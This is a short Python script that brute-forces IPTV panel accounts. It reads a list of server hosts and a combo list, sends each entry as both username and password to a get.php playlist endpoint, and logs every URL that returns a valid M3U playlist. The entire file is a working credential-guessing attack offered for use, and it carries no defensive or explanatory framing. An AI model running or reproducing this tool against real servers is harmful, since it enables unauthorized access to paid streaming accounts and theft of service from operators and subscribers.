from requests import get
from sys import argv

def bruteAccounts(urls, comboFile):
	for user in open(comboFile, 'r').readlines():
		print(f"[i] Trying combo: {user.strip()}")
		for url in open(urls, "r").readlines():
			try:
				accountToTry = f"http://{url.strip()}/get.php?username={user.strip()}&password={user.strip()}&type=m3u&output=ts"
				if "#EXTINF:0" in get(accountToTry, timeout=15, stream=True).text:
					print(f"[+] Playlist URL found: {accountToTry}") 
					f = open("logs.txt", "a+")
					f.write(f"{accountToTry}\n")
					f.close()
			except Exception as e:
				pass

if __name__ == '__main__':
	try:
		urls = argv[1]
		comboFile = argv[2]
		print(f"[+] Loaded {len(open(urls, 'r').readlines())} URLs!")
		bruteAccounts(urls, comboFile)
	except Exception as e:
		print(e)